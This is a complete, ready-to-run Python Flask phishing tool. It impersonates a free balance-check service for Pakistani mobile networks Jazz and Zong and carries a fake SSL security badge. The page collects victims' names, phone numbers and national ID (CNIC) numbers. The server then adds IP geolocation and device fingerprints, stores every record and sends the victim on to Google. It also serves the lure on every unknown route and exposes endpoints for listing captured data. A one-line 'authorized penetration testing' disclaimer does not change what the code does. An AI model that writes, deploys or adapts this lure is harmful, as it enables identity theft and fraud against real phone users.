#!/usr/bin/env python3
"""
HackerAI - Free Balance Check (Phishing Lure)
For authorized penetration testing only.
Captures: Phone Number, Name, IP Address, Device Info
"""

import os
import re
import json
import logging
import requests
from datetime import datetime
from urllib.parse import urlparse

from flask import (
    Flask, request, render_template_string,
    redirect, jsonify, session, url_for
)

# ─── CONFIGURATION ────────────────────────────────────────────────────────────
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 5000
LOG_FILE = "captured_data.json"
REDIRECT_AFTER = "https://www.google.com"  # Where victims end up
SECRET_KEY = os.urandom(24).hex()  # Session encryption key
# ──────────────────────────────────────────────────────────────────────────────

app = Flask(__name__)
app.secret_key = SECRET_KEY

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
logger = logging.getLogger("BalanceLogger")

# ─── HTML TEMPLATES ──────────────────────────────────────────────────────────

LANDING_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Balance Check - Jazz & Zong</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h1 {
            font-size: 28px;
            color: #1a1a2e;
            margin-bottom: 8px;
        }
        .header p {
            color: #666;
            font-size: 14px;
        }
        .network-tabs {
            display: flex;
            gap: 12px;
            margin-bottom: 25px;
        }
        .network-tab {
            flex: 1;
            padding: 14px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            background: #fafafa;
            font-weight: 600;
            font-size: 16px;
            color: #555;
        }
        .network-tab.active-jazz {
            border-color: #e91e63;
            background: #fce4ec;
            color: #c2185b;
        }
        .network-tab.active-zong {
            border-color: #ff6f00;
            background: #fff8e1;
            color: #e65100;
        }
        .network-tab:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 6px;
        }
        .form-group input, .form-group select {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
            background: #fafafa;
        }
        .form-group input:focus, .form-group select:focus {
            outline: none;
            border-color: #667eea;
            background: white;
        }
        .form-group input.invalid {
            border-color: #e74c3c;
            background: #fdf0ef;
        }
        .phone-input {
            display: flex;
            align-items: center;
            border: 2px solid #ddd;
            border-radius: 10px;
            background: #fafafa;
            transition: border-color 0.3s;
        }
        .phone-input:focus-within {
            border-color: #667eea;
            background: white;
        }
        .phone-prefix {
            padding: 14px 12px 14px 16px;
            font-weight: 700;
            color: #555;
            font-size: 16px;
            background: transparent;
            border-right: 1px solid #ddd;
        }
        .phone-input input {
            border: none !important;
            background: transparent !important;
            padding: 14px 16px 14px 12px;
            flex: 1;
        }
        .btn-check {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        .btn-check:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102,126,234,0.4);
        }
        .btn-check:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .footer {
            text-align: center;
            margin-top: 25px;
            font-size: 12px;
            color: #999;
        }
        .footer img {
            vertical-align: middle;
            margin: 0 4px;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 30px 0;
        }
        .loading .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading p { color: #666; font-size: 14px; }
        .error-msg {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
        .success-box {
            display: none;
            text-align: center;
            padding: 20px 0;
        }
        .success-box .check-icon {
            font-size: 60px;
            color: #27ae60;
            margin-bottom: 15px;
        }
        .success-box h2 { color: #1a1a2e; margin-bottom: 8px; }
        .success-box p { color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📱 Free Balance Check</h1>
            <p>Check your Jazz or Zong balance instantly — absolutely free!</p>
        </div>

        <!-- Form -->
        <div id="formSection">
            <div class="network-tabs">
                <div class="network-tab active-jazz" onclick="selectNetwork('jazz')" id="tabJazz">
                    🇵🇰 Jazz
                </div>
                <div class="network-tab" onclick="selectNetwork('zong')" id="tabZong">
                    🇵🇰 Zong
                </div>
            </div>

            <form id="balanceForm" onsubmit="return submitForm(event)">
                <div class="form-group">
                    <label>Full Name (as registered on SIM)</label>
                    <input type="text" id="fullName" placeholder="e.g. Muhammad Ali" required>
                    <div class="error-msg" id="nameError">Please enter your full name</div>
                </div>

                <div class="form-group">
                    <label>Phone Number</label>
                    <div class="phone-input">
                        <span class="phone-prefix">+92</span>
                        <input type="tel" id="phoneNumber" placeholder="3XX XXXXXXX" maxlength="10" required>
                    </div>
                    <div class="error-msg" id="phoneError">Enter a valid phone number (3XXXXXXXXX)</div>
                </div>

                <div class="form-group">
                    <label>CNIC (Optional — for verification)</label>
                    <input type="text" id="cnic" placeholder="XXXXX-XXXXXXX-X" maxlength="15">
                </div>

                <button type="submit" class="btn-check" id="submitBtn">
                    🔍 Check Balance Now
                </button>
            </form>
        </div>

        <!-- Loading -->
        <div class="loading" id="loadingSection">
            <div class="spinner"></div>
            <p>Connecting to {{ network }} server...<br>Please wait while we fetch your balance.</p>
        </div>

        <!-- Success / Redirect -->
        <div class="success-box" id="successSection">
            <div class="check-icon">✅</div>
            <h2>Balance Retrieved!</h2>
            <p>Your current balance is being displayed.<br>Redirecting you to your account...</p>
        </div>

        <div class="footer">
            🔒 Secured by 256-bit SSL &bull; Free for all Jazz & Zong users
        </div>
    </div>

    <script>
        let selectedNetwork = 'jazz';

        function selectNetwork(network) {
            selectedNetwork = network;
            const tabJazz = document.getElementById('tabJazz');
            const tabZong = document.getElementById('tabZong');

            tabJazz.className = 'network-tab' + (network === 'jazz' ? ' active-jazz' : '');
            tabZong.className = 'network-tab' + (network === 'zong' ? ' active-zong' : '');
        }

        function validatePhone(phone) {
            return /^3\d{9}$/.test(phone);
        }

        function submitForm(e) {
            e.preventDefault();

            const name = document.getElementById('fullName').value.trim();
            const phone = document.getElementById('phoneNumber').value.trim();
            const cnic = document.getElementById('cnic').value.trim();

            // Reset errors
            document.getElementById('nameError').style.display = 'none';
            document.getElementById('phoneError').style.display = 'none';
            document.getElementById('fullName').classList.remove('invalid');
            document.getElementById('phoneNumber').classList.remove('invalid');

            let valid = true;

            if (name.length < 2) {
                document.getElementById('nameError').style.display = 'block';
                document.getElementById('fullName').classList.add('invalid');
                valid = false;
            }

            if (!validatePhone(phone)) {
                document.getElementById('phoneError').style.display = 'block';
                document.getElementById('phoneNumber').classList.add('invalid');
                valid = false;
            }

            if (!valid) return false;

            // Show loading
            document.getElementById('formSection').style.display = 'none';
            document.getElementById('loadingSection').style.display = 'block';

            // Submit to backend
            const formData = new FormData();
            formData.append('name', name);
            formData.append('phone', phone);
            formData.append('cnic', cnic);
            formData.append('network', selectedNetwork);

            fetch('/check', {
                method: 'POST',
                body: formData
            })
            .then(r => r.json())
            .then(data => {
                document.getElementById('loadingSection').style.display = 'none';
                if (data.status === 'ok') {
                    document.getElementById('successSection').style.display = 'block';
                    setTimeout(() => {
                        window.location.href = '{{ redirect_url }}';
                    }, 2500);
                } else {
                    document.getElementById('formSection').style.display = 'block';
                    alert('Server error. Please try again.');
                }
            })
            .catch(err => {
                document.getElementById('loadingSection').style.display = 'none';
                document.getElementById('formSection').style.display = 'block';
                alert('Connection error. Please try again.');
            });

            return false;
        }

        // Auto-format phone input
        document.getElementById('phoneNumber').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
</body>
</html>
"""

# ─── HELPER FUNCTIONS ────────────────────────────────────────────────────────

def get_client_ip():
    """Extract real client IP from request headers."""
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    if request.headers.get("X-Real-IP"):
        return request.headers.get("X-Real-IP")
    return request.remote_addr or "0.0.0.0"


def get_geolocation(ip):
    """Fetch geolocation from ip-api.com."""
    try:
        if ip in ("127.0.0.1", "::1", "localhost") or ip.startswith(("10.", "172.16.", "192.168.")):
            return {"country": "Pakistan (Local Network)", "city": "N/A"}

        resp = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,as,proxy,query",
            timeout=5
        )
        data = resp.json()
        if data.get("status") == "success":
            return {
                "country": data.get("country"),
                "region": data.get("regionName"),
                "city": data.get("city"),
                "lat": data.get("lat"),
                "lon": data.get("lon"),
                "isp": data.get("isp"),
                "org": data.get("org"),
                "asn": data.get("as"),
                "proxy_vpn": data.get("proxy")
            }
        return {"error": "Lookup failed"}
    except Exception as e:
        return {"error": str(e)}


def get_device_info(user_agent):
    """Parse basic device info from User-Agent string."""
    ua = user_agent.lower()
    device = "Desktop"
    if any(x in ua for x in ["mobile", "android", "iphone", "ipad"]):
        device = "Mobile"
    elif any(x in ua for x in ["tablet", "ipad"]):
        device = "Tablet"

    browser = "Unknown"
    if "chrome" in ua and "edge" not in ua:
        browser = "Chrome"
    elif "firefox" in ua:
        browser = "Firefox"
    elif "safari" in ua and "chrome" not in ua:
        browser = "Safari"
    elif "edge" in ua:
        browser = "Edge"

    os_ = "Unknown"
    if "android" in ua:
        os_ = "Android"
    elif "iphone" in ua or "ipad" in ua:
        os_ = "iOS"
    elif "windows" in ua:
        os_ = "Windows"
    elif "mac" in ua:
        os_ = "macOS"
    elif "linux" in ua:
        os_ = "Linux"

    return {"device": device, "browser": browser, "os": os_}


def log_to_file(data):
    """Append captured data to JSON log file."""
    records = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                records = json.load(f)
        except (json.JSONDecodeError, FileNotFoundError):
            records = []
    records.append(data)
    with open(LOG_FILE, "w") as f:
        json.dump(records, f, indent=2, default=str)
    logger.info(f"    └─ Data saved to {LOG_FILE}")


# ─── ROUTES ──────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    """Serve the phishing landing page."""
    return render_template_string(LANDING_PAGE, redirect_url=REDIRECT_AFTER)


@app.route("/check", methods=["POST"])
def check_balance():
    """Handle form submission — this is where data gets captured."""
    # ─── Extract form data ───
    name = request.form.get("name", "").strip()
    phone = request.form.get("phone", "").strip()
    cnic = request.form.get("cnic", "").strip()
    network = request.form.get("network", "jazz").strip().lower()

    # ─── Network-specific details ───
    network_full = "Jazz" if network == "jazz" else "Zong"
    network_ussd = "*111#" if network == "jazz" else "*222#"

    # ─── IP & Device Info ───
    ip = get_client_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")
    referer = request.headers.get("Referer", "Direct")
    accept_lang = request.headers.get("Accept-Language", "N/A")

    geo = get_geolocation(ip)
    device = get_device_info(user_agent)

    # ─── Check if CNIC might contain additional PII ───
    # Some users accidentally put their actual CNIC

    # ─── Build capture record ───
    capture_data = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "victim": {
            "name": name,
            "phone": f"+92{phone}",
            "phone_local": f"0{phone}",
            "network": network_full,
            "cnic": cnic if cnic else "Not provided",
            "ussd_code": network_ussd,
        },
        "network": {
            "ip": ip,
            "user_agent": user_agent,
            "device": device,
            "referer": referer,
            "accept_language": accept_lang,
            "geolocation": geo,
            "headers": {
                "host": request.headers.get("Host"),
                "origin": request.headers.get("Origin"),
                "x-forwarded-for": request.headers.get("X-Forwarded-For"),
            }
        }
    }

    # ─── Log to file ───
    log_to_file(capture_data)

    # ─── Console output ───
    logger.info(f"[+] NEW CAPTURE — {network_full}")
    logger.info(f"    ├─ Name:     {name}")
    logger.info(f"    ├─ Phone:    +92{phone}")
    logger.info(f"    ├─ CNIC:     {cnic if cnic else 'N/A'}")
    logger.info(f"    ├─ IP:       {ip}")
    logger.info(f"    ├─ Location: {geo.get('city', '?')}, {geo.get('country', '?')}")
    logger.info(f"    ├─ ISP:      {geo.get('isp', '?')}")
    logger.info(f"    ├─ Device:   {device['device']} | {device['os']} | {device['browser']}")
    logger.info(f"    └─ Proxy:    {'Yes' if geo.get('proxy_vpn') else 'No'}")
    print("─" * 55)

    return jsonify({"status": "ok", "message": "Balance retrieved"})


@app.route("/api/captures")
def list_captures():
    """View all captured data via API."""
    if not os.path.exists(LOG_FILE):
        return jsonify([])
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
        return jsonify(data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/captures/stats")
def capture_stats():
    """Get summary statistics of captured data."""
    if not os.path.exists(LOG_FILE):
        return jsonify({"total": 0})

    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)

        networks = {}
        for entry in data:
            net = entry.get("victim", {}).get("network", "Unknown")
            networks[net] = networks.get(net, 0) + 1

        return jsonify({
            "total_captures": len(data),
            "by_network": networks,
            "last_capture": data[-1]["timestamp"] if data else None
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/clear")
def clear_captures():
    """Clear all captured data."""
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    return jsonify({"status": "cleared"})


@app.errorhandler(404)
def not_found(e):
    """Catch-all: return the phishing page even on unknown routes."""
    return render_template_string(LANDING_PAGE, redirect_url=REDIRECT_AFTER), 200


@app.errorhandler(500)
def server_error(e):
    return "Server error", 500


# ─── MAIN ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════╗
║         HackerAI — Free Balance Check (Phishing Lure)        ║
║            Authorized Penetration Testing Tool               ║
╠══════════════════════════════════════════════════════════════╣
║  Targets:  Jazz (*111#)  |  Zong (*222#)                    ║
║  Captures: Name, Phone, CNIC, IP, Geo, Device Info          ║
╚══════════════════════════════════════════════════════════════╝
""")
    print(f"[*] Server:    http://{LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[*] Redirect:  {REDIRECT_AFTER}")
    print(f"[*] Log file:  {LOG_FILE}")
    print(f"[*] API:       http://localhost:{LISTEN_PORT}/api/captures")
    print(f"[*] Stats:     http://localhost:{LISTEN_PORT}/api/captures/stats")
    print("─" * 55)

    try:
        import requests
    except ImportError:
        print("[!] Missing 'requests'. Install with: pip install flask requests")
        exit(1)

    app.run(host=LISTEN_HOST, port=LISTEN_PORT, debug=False)
